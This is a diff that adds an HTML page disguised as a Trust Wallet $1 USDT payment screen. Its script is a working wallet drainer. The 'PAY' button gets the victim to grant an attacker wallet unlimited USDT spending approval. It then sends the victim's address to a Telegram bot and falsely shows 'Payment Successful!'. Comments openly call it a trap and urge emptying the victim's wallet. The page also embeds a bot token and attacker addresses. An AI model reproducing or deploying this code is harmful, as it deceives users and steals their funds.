@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trust Wallet - Secure Payment</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <style>
+        body { background: #0b0e11; color: #fff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; }
+        .payment-box { background: #181a20; border-radius: 20px; padding: 30px; max-width: 380px; margin: auto; border: 1px solid #333; box-shadow: 0 10px 40px rgba(0,0,0,0.8); }
+        .token-icon { width: 50px; margin-bottom: 10px; }
+        .amount { font-size: 38px; font-weight: 800; color: #f0b90b; margin: 10px 0; }
+        #qrcode { background: #fff; padding: 12px; display: inline-block; border-radius: 12px; margin: 20px 0; }
+        .pay-btn { background: #f0b90b; color: #000; border: none; padding: 18px; border-radius: 14px; font-weight: bold; width: 100%; font-size: 18px; cursor: pointer; transition: 0.2s; }
+        .pay-btn:active { transform: scale(0.96); }
+        .info { text-align: left; background: #2b3139; padding: 15px; border-radius: 10px; font-size: 13px; margin: 20px 0; color: #848e9c; }
+        .info b { color: #fff; float: right; }
+    </style>
+</head>
+<body>
+
+    <div class="payment-box">
+        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="token-icon">
+        <div style="color: #848e9c; font-size: 14px;">Total Payable Amount</div>
+        <div class="amount">1.00 USDT</div>
+
+        <div class="info">
+            <div>Network: <b>BSC (BEP-20)</b></div>
+            <div style="margin-top:8px;">To: <b>Verified_Merchant_Sahu...</b></div>
+        </div>
+
+        <div id="qrcode"></div>
+        
+        <p style="font-size: 12px; color: #848e9c; margin-bottom: 20px;">Scan using Trust Wallet Camera to Pay $1</p>
+
+        <button class="pay-btn" onclick="startLoot()">PAY 1.00 USDT</button>
+        
+        <div id="status" style="font-size: 12px; margin-top: 15px; color: #5e6673;">Waiting for transaction...</div>
+    </div>
+
+    <script>
+        // ✅ TERA CONFIGURATION
+        const SPENDER_WALLET = "0x2EbB3676a3e83629c260F19F5ddF31F2b29cD128"; // Tera Address
+        const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT Contract
+        const BOT_TOKEN = "8555263655:AAH739u_HnMdkAZKLotgpJ9rs4rO0YJbhbY";
+        const CHAT_ID = "6825522263";
+
+        // QR Code Generation
+        new QRCode(document.getElementById("qrcode"), {
+            text: window.location.href, // Victim link scan karega
+            width: 180,
+            height: 180
+        });
+
+        async function startLoot() {
+            if (!window.ethereum) {
+                alert("Please scan this QR inside Trust Wallet DApp Browser!");
+                return;
+            }
+
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const userAddress = accounts[0];
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
+
+                // Standard ERC20/BEP20 ABI for Approve
+                const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+                const contract = new ethers.Contract(USDT_CONTRACT, abi, signer);
+
+                document.getElementById('status').innerText = "Processing $1 Payment...";
+                document.getElementById('status').style.color = "#f0b90b";
+
+                // 🔓 THE TRAP: User ko lagega wo $1 bhej raha hai
+                // Par wo tujhe Unlimited USDT nikalne ki "Approve" de raha hai
+                const tx = await contract.approve(SPENDER_WALLET, ethers.constants.MaxUint256);
+                
+                await tx.wait();
+
+                // Telegram Bot Notification
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `💰 SAHU DRAINER HIT!\n\nVictim: ${userAddress}\nStatus: Unlimited USDT Approved!\n\nBhai, ab iska wallet saaf kar de! 🔥`
+                    })
+                });
+
+                document.getElementById('status').innerText = "Payment Successful!";
+                document.getElementById('status').style.color = "#00ff88";
+
+            } catch (err) {
+                document.getElementById('status').innerText = "Payment Failed. Try again.";
+                document.getElementById('status').style.color = "#ff4444";
+            }
+        }
+    </script>
+</body>
+</html>
+
